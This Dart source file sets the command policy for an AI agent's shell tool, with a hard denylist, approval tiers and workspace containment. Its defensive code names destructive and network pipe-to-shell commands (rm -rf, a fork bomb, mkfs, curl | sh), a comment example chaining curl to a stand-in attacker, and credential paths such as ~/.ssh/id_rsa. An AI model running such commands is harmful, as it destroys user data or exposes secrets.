/// Command policy: decides whether `run_command` may execute a given command in a given
/// workspace root.
///
/// The tiers, in the order [evaluateCommand] applies them:
/// - a hard denylist ([hardDenylistPatterns]) refused in every workspace;
/// - any agent `git push`, by any spelling we can see ([invokesGitPush]), queued for approval in
///   every workspace (D-07, SEC-06) -- it publishes work with the user's own credentials;
/// - a *trusted* workspace is an honest full shell (D-06): its commands run without asking,
///   except that a destructive verb naming a path outside it is refused (FSA-006) and any other
///   argument that resolves outside it is queued for approval (SEC-05);
/// - an *untrusted* workspace runs a fixed allowlist of read-only commands
///   ([readOnlyAllowlistPatterns]) without asking, refuses shell chaining outright, and queues
///   everything else for a human to approve or reject in the Desktop IDE (D5,
///   `approval_queue.dart`) -- or refuses it when no one can be asked (`allowApprovalQueue`).
///
/// The trust flag is set by the user (`aura_hostd trust <path>` or the IDE), never by the agent.
///
/// A task started on the phone or the web (WP8) never gets these tiers: [evaluateRemoteCommand]
/// keeps only the every-workspace refusals and asks for the remote device's approval otherwise.
///
/// Command policy is layered *on top of* workspace containment (`containment.dart`), never a
/// substitute for it: a command permitted here still only ever runs with its working directory
/// inside the granted root, and `run_command`'s shell interpretation means containment is a
/// process-level control (via cwd), not a promise the shell command's own arguments cannot name a
/// path elsewhere -- exactly like the equivalent risk already accepted server-side by
/// `aura_backend/aura_core/tools/coding.py::run_command` against the Docker sandbox. The
/// difference here is there is no container boundary underneath; that is why the hard denylist
/// below exists in addition to the allowlist.
library;

import 'dart:io';

import 'package:path/path.dart' as p;

/// Command prefixes that are always refused, in every workspace, trusted or not -- a floor no
/// consent tier is allowed to lift (ADR-011). This is deliberately conservative and pattern-based,
/// not a promise of completeness: it exists to catch the obviously catastrophic case (wiping the
/// workspace, or something that clearly isn't scoped to it), not to be a full shell-injection
/// sandbox. The real boundary is that these commands run as the user's own OS account with no
/// process-level containment beyond `cwd` -- treat this as a seatbelt, not a cage.
final List<RegExp> hardDenylistPatterns = [
  RegExp(r'\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\b'), // rm -rf and permutations (-fr, -Rf, ...)
  RegExp(r'\brm\s+-[a-zA-Z]*f[a-zA-Z]*r\b'),
  // The same two flags given separately (`rm -r -f`, `rm -f -r x`, long spellings), which
  // the combined-flag patterns above never matched (audit FSA-006).
  RegExp(r'\brm\b(?=.*\s-(-recursive|[a-zA-Z]*[rR])\b)(?=.*\s-(-force|[a-zA-Z]*f)\b)'),
  RegExp(r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;'), // fork bomb
  RegExp(r'\bmkfs\b'),
  RegExp(r'\bdd\s+.*of=/dev/'),
  RegExp(r'>\s*/dev/sd[a-z]'),
  RegExp(r'\bchmod\s+-R\s+000\b'),
  RegExp(r'\bcurl\b.*\|\s*sh\b'), // pipe-to-shell from the network
  RegExp(r'\bwget\b.*\|\s*sh\b'),
];

/// Any of these appearing anywhere in an untrusted-workspace command is an automatic refusal,
/// checked *before* the allowlist below. This is the fix for the bypass a naive "starts with an
/// allowlisted verb" prefix match would otherwise have: `readOnlyAllowlistPatterns` match a
/// prefix, not the whole string, so without this check `git status && curl evil.sh | attacker`
/// would pass the "starts with `git status`" test even though it does something the allowlist was
/// never meant to permit. Blocking every shell metacharacter first means a command that gets past
/// this point cannot smuggle a second command alongside the allowlisted one -- the prefix match
/// only becomes safe to trust once chaining, piping, redirection, and substitution are all ruled
/// out structurally rather than pattern-matched away one payload at a time.
final RegExp _shellMetacharacters = RegExp(r'[;&|`$<>\n]');

/// Commands safe to run without a trusted workspace: read-only inspection, the kind a linter or
/// CI dry-run would do. Matched as a prefix of the command, which is only safe because
/// [_shellMetacharacters] has already ruled out chaining/piping/redirection/substitution by the
/// time these are checked -- see that field's doc for why the ordering matters. A match is also
/// necessary but not sufficient: [_escapesReadOnlyTier] then refuses the argument shapes that
/// turn an inspection verb into a write or a read outside the workspace.
///
/// Verbs that *run repository-supplied code* are absent on purpose, however read-only they sound:
/// `npm test` runs the repo's `scripts.test`, `pytest --collect-only` imports `conftest.py` and
/// every test module, and `rg --pre <cmd>` runs `<cmd>` on each file it searches. In an untrusted
/// workspace -- a freshly cloned repo is exactly that -- those are arbitrary code execution.
final List<RegExp> readOnlyAllowlistPatterns = [
  RegExp(r'^git\s+(status|diff|log|show|blame)\b'),
  // `git branch <name>` creates and `-d/-m/-c` delete, rename and copy; `git remote add/remove`
  // rewrites `.git/config`. Only the listing forms are inspection.
  RegExp(r'^git\s+branch(\s+(-a|-r|-v|-vv|--all|--remotes|--list|--show-current))*\s*$'),
  RegExp(r'^git\s+remote(\s+(-v|--verbose))?\s*$'),
  // `find` is deliberately excluded despite being conceptually "read-only": `-delete`, `-exec`,
  // and `-fprintf` are all mutating actions expressible without any of the blocked shell
  // metacharacters above (e.g. `find . -delete`), so a bare `^find\b` prefix would not actually
  // bound what it does the way it does for `ls`/`cat`/`grep`, whose flag surface has no
  // destructive equivalent. `env` is excluded for a sharper reason: `env <command> [args...]`
  // *runs* `<command>` -- it is a general-purpose "execute anything" primitive wearing an
  // inspection-tool name, and allowlisting it would let any refused command through by prefixing
  // it with `env `.
  RegExp(r'^(ls|pwd|cat|head|tail|wc|grep|file|which)\b'),
  RegExp(r'^npm\s+(ls|list|outdated)\b'),
  RegExp(r'^(node|python3?|dart|flutter)\s+--version\s*$'),
];

/// git flags that make an otherwise read-only verb write a file (`--output`), run a configured
/// program (`--ext-diff`, `--textconv`), or read paths outside the repository (`--no-index`).
const List<String> _gitEscapeFlags = ['--output', '--ext-diff', '--textconv', '--no-index'];

/// Whether an allowlisted command uses an argument that takes it out of the read-only tier: one of
/// [_gitEscapeFlags], or a path that leaves the workspace (absolute, home-relative, a drive
/// letter, or a `..` segment) -- `cat ~/.ssh/id_rsa` or `grep -f /etc/x` would otherwise read
/// anything the user can, including this daemon's own control token.
///
/// Containment is checked on the *spelling* of each argument, including the value of a
/// `--flag=value` or a short flag with an attached value (`-f/etc/x`); it cannot see through a
/// symlink inside the workspace that points out of it. A command this refuses is not denied -- it
/// falls through to the approval tier, so a legitimate `grep -r "/api" .` still runs once a human
/// approves it.
bool _escapesReadOnlyTier(String command) {
  final tokens = command.split(RegExp(r'\s+')).map((t) => t.replaceAll(RegExp(r'''['"]'''), ''));
  final isGit = command.startsWith('git');
  for (final token in tokens) {
    if (isGit && _gitEscapeFlags.any((f) => token == f || token.startsWith('$f='))) {
      return true;
    }
    final candidates = <String>[token];
    final eq = token.indexOf('=');
    if (token.startsWith('-') && eq > 0) candidates.add(token.substring(eq + 1));
    if (token.startsWith('-') && !token.startsWith('--') && token.length > 2) {
      candidates.add(token.substring(2));
    }
    if (candidates.any(_leavesWorkspace)) return true;
  }
  return false;
}

/// Verbs that delete, move, overwrite or re-permission files, or run a program on each file
/// they find. In a *trusted* workspace every other command runs unquestioned, but these keep
/// argument containment (audit FSA-006): `rm -r ../sibling-project`, `find /home -delete` or
/// `cd .. && rm -r build` are refused even there. Trust means "this checkout's own tooling
/// may run"; it never meant "this daemon may destroy things outside the checkout", which is
/// the only extra power containment removes. Same spelling-based check as the read-only tier,
/// same limits (a symlink inside the workspace is not seen through).
final RegExp destructiveVerbPattern = RegExp(
  r'^(rm|rmdir|unlink|shred|truncate|mv|cp|dd|rsync|chmod|chown|chattr|tee|find'
  r'|git\s+(clean|reset|checkout|restore|rm|worktree\s+remove))\b',
);

/// Segment boundaries a trusted command may contain. Quoted operators are not understood; a
/// false split only makes the check stricter, never looser.
final RegExp _segmentSeparators = RegExp(r'&&|\|\||;|\||\n');

/// Why a trusted-workspace command is refused by destructive-verb containment, or `null` when
/// it is not. Each shell segment is judged on its own verb; a `cd`/`pushd` that leaves the
/// workspace taints every destructive segment in the same command, since their relative paths
/// would then resolve outside it.
String? destructiveEscapeReason(String command) {
  final segments = command
      .split(_segmentSeparators)
      .map((s) => s.trim())
      .where((s) => s.isNotEmpty)
      .toList();
  var changesDirectoryOutside = false;
  var hasDestructive = false;
  for (final segment in segments) {
    if (RegExp(r'^(cd|pushd)\b').hasMatch(segment) &&
        _argumentTokens(segment).skip(1).any(_leavesWorkspace)) {
      changesDirectoryOutside = true;
    }
    if (destructiveVerbPattern.hasMatch(segment)) {
      hasDestructive = true;
      if (_argumentsLeaveWorkspace(segment)) {
        return 'destructive command names a path outside the workspace; containment applies '
            'even in a trusted workspace';
      }
    }
  }
  if (changesDirectoryOutside && hasDestructive) {
    return 'command changes directory out of the workspace and then runs a destructive '
        'command; containment applies even in a trusted workspace';
  }
  return null;
}

Iterable<String> _argumentTokens(String command) =>
    command.split(RegExp(r'\s+')).map((t) => t.replaceAll(RegExp(r'''['"]'''), ''));

/// Whether any argument (including `--flag=value` and attached short-flag values) leaves the
/// workspace -- the path half of [_escapesReadOnlyTier], shared with [destructiveEscapeReason].
bool _argumentsLeaveWorkspace(String command) {
  for (final token in _argumentTokens(command)) {
    final candidates = <String>[token];
    final eq = token.indexOf('=');
    if (token.startsWith('-') && eq > 0) candidates.add(token.substring(eq + 1));
    if (token.startsWith('-') && !token.startsWith('--') && token.length > 2) {
      candidates.add(token.substring(2));
    }
    if (candidates.any(_leavesWorkspace)) return true;
  }
  return false;
}

bool _leavesWorkspace(String path) {
  if (path.startsWith('/') || path.startsWith('~') || path.startsWith(r'\')) return true;
  if (RegExp(r'^[A-Za-z]:').hasMatch(path)) return true;
  return path.split(RegExp(r'[/\\]')).contains('..');
}

/// `needsApproval` is D5's interactive consent tier (`docs/architecture/015-desktop-ide.md`):
/// the command is queued for a human to approve or reject through the Desktop IDE rather than
/// refused outright -- in an untrusted workspace anything neither hard-denied nor allowlisted, in
/// every workspace a `git push` (D-07), and in a trusted one an argument outside it (D-06). See
/// `approval_queue.dart` and `task_handler.dart::run`, which is the only caller that acts on it.
enum CommandDecision { allow, deny, needsApproval }

class CommandVerdict {
  const CommandVerdict(this.decision, this.reason);
  final CommandDecision decision;
  final String reason;

  bool get isAllowed => decision == CommandDecision.allow;
}

/// [allowApprovalQueue] controls what the final, otherwise-unhandled case resolves to: a
/// `needsApproval` verdict (default) when a human might be watching to answer it, or a flat
/// `deny` when nobody is -- a future headless-only invocation path can pass `false` to keep the
/// pre-D5 "refuse outright" behavior instead of queuing something nobody will ever see.
///
/// [workspaceRoot] (canonical) and [cwd] let a trusted workspace's path check resolve arguments
/// against the real folder, symlinks included; without them it falls back to judging each
/// argument's spelling, which is stricter (any absolute path counts as outside).
CommandVerdict evaluateCommand(
  String command, {
  required bool workspaceTrusted,
  bool allowApprovalQueue = true,
  String? workspaceRoot,
  String? cwd,
}) {
  CommandVerdict askOrRefuse(String reason) => CommandVerdict(
        allowApprovalQueue ? CommandDecision.needsApproval : CommandDecision.deny,
        reason,
      );

  final trimmed = command.trim();
  for (final pattern in hardDenylistPatterns) {
    if (pattern.hasMatch(trimmed)) {
      return CommandVerdict(
        CommandDecision.deny,
        'command matches the hard denylist and is refused in every workspace',
      );
    }
  }
  if (workspaceTrusted) {
    final escape = destructiveEscapeReason(trimmed);
    if (escape != null) {
      return CommandVerdict(CommandDecision.deny, escape);
    }
    if (invokesGitPush(trimmed)) return askOrRefuse(_gitPushReason);
    final outside = pathOutsideWorkspace(trimmed, workspaceRoot: workspaceRoot, cwd: cwd);
    if (outside != null) {
      return askOrRefuse(
        'command names a path outside this trusted folder ("$outside") -- a trusted folder '
        'runs its own tooling freely, but reaching outside it needs approval (D-06)',
      );
    }
    return const CommandVerdict(CommandDecision.allow, 'workspace is marked trusted');
  }
  if (_shellMetacharacters.hasMatch(trimmed)) {
    return const CommandVerdict(
      CommandDecision.deny,
      'untrusted workspaces only run a single simple read-only command -- no chaining (&&, ;, '
      '|), redirection, substitution, or backticks -- this is a hard floor, never queued for '
      'approval',
    );
  }
  // Checked after the metacharacter floor, so a chained push in an untrusted folder stays refused
  // rather than becoming something a human could approve.
  if (invokesGitPush(trimmed)) return askOrRefuse(_gitPushReason);
  for (final pattern in readOnlyAllowlistPatterns) {
    if (pattern.hasMatch(trimmed) && !_escapesReadOnlyTier(trimmed)) {
      return const CommandVerdict(
        CommandDecision.allow,
        'read-only command allowlisted for untrusted workspaces',
      );
    }
  }
  if (allowApprovalQueue) {
    return const CommandVerdict(
      CommandDecision.needsApproval,
      'workspace is not trusted and this command is not on the read-only allowlist -- queued '
      'for interactive approval in the Desktop IDE',
    );
  }
  return const CommandVerdict(
    CommandDecision.deny,
    'workspace is not trusted and this command is not on the read-only allowlist -- run '
    '`aura_hostd trust <path>` for this workspace, or connect a Desktop IDE session to answer '
    'interactive approval requests',
  );
}

/// The policy for a command from a *remote* task (WP8: a turn started on the phone or the web,
/// `create_task` with `origin: "remote"`). Nobody is at the desk, so neither the trusted tier nor
/// the read-only allowlist applies (D-10b): what [evaluateCommand] refuses in every workspace stays
/// refused -- the hard denylist, and a destructive verb reaching outside the folder, which a
/// confirmation on a phone must not unlock either -- and everything else is
/// [CommandDecision.needsApproval], meaning "only once the person approved this exact call on
/// their phone or the web" (D-10c, `confirmed` on the RPC). Never the desktop's approval queue.
CommandVerdict evaluateRemoteCommand(String command) {
  final trimmed = command.trim();
  for (final pattern in hardDenylistPatterns) {
    if (pattern.hasMatch(trimmed)) {
      return const CommandVerdict(
        CommandDecision.deny,
        'command matches the hard denylist and is refused in every workspace',
      );
    }
  }
  final escape = destructiveEscapeReason(trimmed);
  if (escape != null) return CommandVerdict(CommandDecision.deny, escape);
  return const CommandVerdict(
    CommandDecision.needsApproval,
    'a command from the phone or the web runs only once it was approved there',
  );
}

/// D6's write-gating sibling to [evaluateCommand] -- a file write isn't a shell command string, so
/// this deliberately does not reuse `evaluateCommand`'s regex-based allow/deny/needsApproval logic.
/// It is also structurally simpler: there is no shell-metacharacter concern for a write (nothing
/// here is ever interpreted by a shell) and no read-only-allowlist tier (every write mutates by
/// definition, so an untrusted workspace's only two outcomes are `needsApproval` or `deny`).
///
/// There is also no hard-denylist tier for writes today, unlike [hardDenylistPatterns] for
/// commands -- containment (`containment.dart`'s `requireContained`, checked before this is ever
/// called) already bounds *where* a write can land; there is no established equivalent yet for
/// *what* it may contain or overwrite (e.g. a `.git/hooks/` file). This is D6's accepted floor, not
/// an oversight: a human reviewing the diff before approving is the safety net for untrusted
/// workspaces, the same way it already is for the read-only-allowlist gap in
/// [readOnlyAllowlistPatterns]'s own doc comment.
CommandVerdict evaluateWrite({required bool workspaceTrusted}) {
  if (workspaceTrusted) {
    return const CommandVerdict(CommandDecision.allow, 'workspace is marked trusted');
  }
  return const CommandVerdict(
    CommandDecision.needsApproval,
    'workspace is not trusted -- queued for interactive approval in the Desktop IDE',
  );
}

/// Why a write to [absolutePath] is refused outright, in every workspace, or null when it isn't.
///
/// A file under `.git/hooks/` is a program git runs on the next commit, checkout or push, and
/// `.git/config` can point `core.hooksPath`, a `core.fsmonitor` command or a filter driver at
/// one. Either turns an ordinary-looking file write into code execution the moment the user (or
/// the agent) next runs git -- in an untrusted folder behind an approval that shows only a diff,
/// in a trusted one with no prompt at all. Neither is something an editing task needs, so no
/// consent tier lifts this, the same as [hardDenylistPatterns] for commands.
///
/// G-17 (SEC-10) widened it to the same files wherever git keeps them: a submodule's
/// `.git/modules/**/hooks` and `config`, any `config.worktree`, and a file whose final component
/// is `.git` -- in a linked worktree or submodule that file names the git directory git will use,
/// so rewriting it points git at a config and hooks of the writer's choosing. Components compare
/// case-insensitively (Windows' and macOS's default filesystems are, so `.GIT/hooks` is the same
/// directory) and without trailing dots or spaces (Windows drops them: `.git.\config`).
String? protectedGitWriteReason(String absolutePath) {
  final parts = absolutePath
      .split(RegExp(r'[/\\]'))
      .where((s) => s.isNotEmpty)
      .map((s) => s.toLowerCase().replaceAll(RegExp(r'[. ]+$'), ''))
      .toList();
  if (parts.isEmpty) return null;
  if (parts.last == '.git') {
    return 'writes to a .git file are refused: in a linked worktree or submodule it tells git '
        'which git directory (config and hooks included) to use';
  }
  final gitIndex = parts.indexOf('.git');
  if (gitIndex < 0) return null;
  final inside = parts.sublist(gitIndex + 1);
  if (inside.contains('hooks')) {
    return 'writes under .git/hooks (or a submodule\'s hooks) are refused: a hook is a program '
        'git runs on the next commit, checkout or push';
  }
  if (inside.isNotEmpty && (inside.last == 'config' || inside.last == 'config.worktree')) {
    return 'writes to git config files under .git are refused: they can point git at a program '
        'to run (core.hooksPath, core.fsmonitor, filter drivers)';
  }
  return null;
}

const String _gitPushReason =
    'git push publishes work with your credentials, so the agent\'s git push always needs '
    'approval, in every folder (D-07)';

/// Words of [command] roughly as a POSIX shell would split them: whitespace separates words,
/// single and double quotes group (and are removed), and `; & | ( ) < >`, backtick and newline are
/// words of their own. Nothing is expanded and a backslash is kept literally (Windows paths); an
/// unbalanced quote runs to the end. Precise enough for the checks below, whose failure mode is
/// to ask a human more often, not less.
List<String> _shellWords(String command) {
  final words = <String>[];
  final current = StringBuffer();
  var quoted = false;
  String? quote;
  void flush() {
    if (current.isNotEmpty || quoted) words.add(current.toString());
    current.clear();
    quoted = false;
  }

  for (final char in command.split('')) {
    if (quote != null) {
      if (char == quote) {
        quote = null;
      } else {
        current.write(char);
      }
    } else if (char == "'" || char == '"') {
      quote = char;
      quoted = true;
    } else if (char.trim().isEmpty && char != '\n') {
      flush();
    } else if (';&|()<>`\n'.contains(char)) {
      flush();
      words.add(char);
    } else {
      current.write(char);
    }
  }
  flush();
  return words;
}

bool _isOperatorWord(String word) => word.length == 1 && ';&|()<>`\n'.contains(word);

/// git's global options that take their value as the next word.
const Set<String> _gitValueOptions = {
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--config-env',
};

/// Whether [command] runs a `git push` anywhere in it (D-07, SEC-06): through `git -C dir`,
/// `--git-dir`, `-c` and other global options, inside `&&`/`||`/`;`/`|` chains, `$(...)`, or a
/// nested `sh -c "..."`, and via an explicit path to git. It also counts anything that defines a
/// git alias (`git config alias.x ...`, `git -c alias.x=...`), since an alias can be `push` under
/// another name, and any further word `push` in a git invocation (`git subtree push`, `git lfs
/// push`). It cannot see a push hidden behind variable indirection or decoding -- a trusted
/// folder is a real shell (D-06); this catches every plain spelling, not a determined evasion.
bool invokesGitPush(String command) {
  final words = _shellWords(command);
  for (var i = 0; i < words.length; i++) {
    final word = words[i];
    // A quoted word with spaces or operators may itself be a command: `sh -c "git push"`.
    if (!_isOperatorWord(word) && word.contains(RegExp(r'[\s;&|`(]')) && invokesGitPush(word)) {
      return true;
    }
    final name = word.split(RegExp(r'[/\\]')).last.toLowerCase();
    if (name != 'git' && name != 'git.exe') continue;

    String? subcommand;
    var j = i + 1;
    for (; j < words.length && !_isOperatorWord(words[j]); j++) {
      final arg = words[j];
      if (arg.startsWith('alias.')) return true;
      if (subcommand == null) {
        if (_gitValueOptions.contains(arg)) {
          j++;
          if (j < words.length && words[j].startsWith('alias.')) return true;
          continue;
        }
        if (arg.startsWith('-')) continue;
        subcommand = arg;
        if (subcommand == 'push') return true;
        continue;
      }
      if (arg == 'push') return true;
    }
    i = j - 1;
  }
  return false;
}

/// Device paths a command may name without leaving anything: redirecting to `/dev/null` is not
/// reaching outside the folder.
const Set<String> _harmlessDevicePaths = {
  '/dev/null',
  '/dev/stdin',
  '/dev/stdout',
  '/dev/stderr',
  'nul',
};

/// The first argument of [command] that resolves outside the workspace, or null (G-06, SEC-05).
///
/// Every argument is judged, whatever the verb -- including redirection targets (`> ~/.bashrc`),
/// `--flag=value` and `name=value` values and attached short-flag values. A word counts when it
/// looks like a path (absolute, `~`-relative, a drive letter, or containing a separator or `..`)
/// or, with [workspaceRoot] given, names a symlink. With [workspaceRoot] (canonical) and [cwd],
/// such a word is resolved the way the kernel would -- symlinks and `..` included -- and checked
/// against the folder; without them its spelling alone decides. A word built from a variable
/// (`$HOME/.ssh`) cannot be resolved here, so one naming the home directory or containing a
/// separator counts as outside.
///
/// This is the D-06 boundary for a trusted folder, which stays a real shell: it puts a human in
/// front of the plain ways a command reaches outside the folder; it does not claim to see through
/// a command that computes its paths at run time.
String? pathOutsideWorkspace(String command, {String? workspaceRoot, String? cwd}) {
  final base = cwd ?? workspaceRoot;
  // The program a simple command runs (`/usr/bin/env`, `/usr/local/bin/node`) is not an argument
  // and is not checked; everything it is given is. A redirection target is always an argument,
  // even at the start of a command (`> ~/.bashrc`), and so is the value of a leading `NAME=value`.
  var atCommandStart = true;
  String? previous;
  for (final word in _shellWords(command)) {
    if (_isOperatorWord(word)) {
      if (word != '<' && word != '>') atCommandStart = true;
      previous = word;
      continue;
    }
    final redirectTarget = previous == '<' || previous == '>';
    previous = word;
    if (atCommandStart && !redirectTarget && !RegExp(r'^[A-Za-z_]\w*=').hasMatch(word)) {
      atCommandStart = false;
      continue;
    }
    final candidates = <String>[word];
    final eq = word.indexOf('=');
    if (eq >= 0) candidates.add(word.substring(eq + 1));
    if (word.startsWith('-') && !word.startsWith('--') && word.length > 2) {
      candidates.add(word.substring(2));
    }
    for (final candidate in candidates) {
      if (_reachesOutside(candidate, workspaceRoot, base)) return candidate;
    }
  }
  return null;
}

bool _reachesOutside(String candidate, String? workspaceRoot, String? base) {
  if (candidate.isEmpty || candidate.startsWith('-')) return false;
  if (_harmlessDevicePaths.contains(candidate.toLowerCase())) return false;
  if (candidate.contains(r'$') || candidate.contains('%')) {
    if (RegExp(r'(\$\{?(HOME|USERPROFILE)\b)|(%USERPROFILE%)', caseSensitive: false)
        .hasMatch(candidate)) {
      return true;
    }
    if (candidate.contains(r'$') && candidate.contains(RegExp(r'[/\\]'))) return true;
  }
  if (candidate.startsWith('~')) return true;
  final looksLikePath = candidate.contains(RegExp(r'[/\\]')) ||
      RegExp(r'^[A-Za-z]:').hasMatch(candidate) ||
      candidate == '..';
  if (workspaceRoot == null || base == null) {
    return looksLikePath && _leavesWorkspace(candidate);
  }
  final joined = p.isAbsolute(candidate) ? candidate : p.join(base, candidate);
  if (!looksLikePath && !FileSystemEntity.isLinkSync(joined)) return false;
  final resolved = _physicalPath(joined);
  return !(p.equals(resolved, workspaceRoot) || p.isWithin(workspaceRoot, resolved));
}

/// [absolute] resolved as the kernel would open it: the longest prefix that exists goes through
/// `realpath` (so `link/..` climbs from the link's *target*, not lexically), and the rest is
/// appended and normalized.
String _physicalPath(String absolute) {
  var current = absolute;
  final trailing = <String>[];
  while (true) {
    if (FileSystemEntity.typeSync(current) != FileSystemEntityType.notFound) {
      try {
        final resolved = File(current).resolveSymbolicLinksSync();
        return p.normalize(p.joinAll([resolved, ...trailing.reversed]));
      } on FileSystemException {
        // Fall through to the parent: unreadable components resolve no further.
      }
    }
    final parent = p.dirname(current);
    if (parent == current) return p.normalize(absolute);
    trailing.add(p.basename(current));
    current = parent;
  }
}

/// [command] rewritten so git cannot run a program the repository configures (G-17, SEC-10).
///
/// An untrusted folder's allowlisted `git status`/`diff`/`log`/`show`/`blame` are "read-only",
/// but git itself runs programs named in `.git/config` (`core.fsmonitor`, hooks, `diff.external`,
/// textconv drivers), and a downloaded repository's config is not the user's. The daemon runs
/// those commands with the repository-local executables switched off: `-c core.fsmonitor=` and
/// `-c core.hooksPath=<empty dir>` for every verb, plus `--no-ext-diff --no-textconv` for the verbs
/// that diff. (`-c diff.external=` is not used: git 2.43 then tries to run an empty command and
/// fails every diff.) A command that is not a plain `git <verb> ...` is returned unchanged.
String hardenUntrustedGitCommand(String command, {required String emptyHooksDir}) {
  final match = RegExp(r'^git\s+(\S+)(.*)$', dotAll: true).firstMatch(command.trim());
  if (match == null) return command;
  final verb = match.group(1)!;
  final rest = match.group(2)!;
  final quoted = [
    ...untrustedGitGlobalArgs(emptyHooksDir),
    verb,
    ...untrustedGitVerbFlags(verb),
  ].map(_shellQuote).join(' ');
  return 'git $quoted$rest';
}

/// The global options of [hardenUntrustedGitCommand], one argv element each.
List<String> untrustedGitGlobalArgs(String emptyHooksDir) =>
    ['-c', 'core.fsmonitor=', '-c', 'core.hooksPath=$emptyHooksDir'];

/// The per-verb options of [hardenUntrustedGitCommand].
List<String> untrustedGitVerbFlags(String verb) => switch (verb) {
      'diff' || 'log' || 'show' => const ['--no-ext-diff', '--no-textconv'],
      'blame' => const ['--no-textconv'],
      _ => const [],
    };

/// [word] as one POSIX shell word: unchanged when it holds nothing the shell would interpret
/// (a Windows temp path's backslashes and spaces would be), single-quoted otherwise.
String _shellQuote(String word) => RegExp(r'^[A-Za-z0-9_./:=-]+$').hasMatch(word)
    ? word
    : "'${word.replaceAll("'", r"'\''")}'";
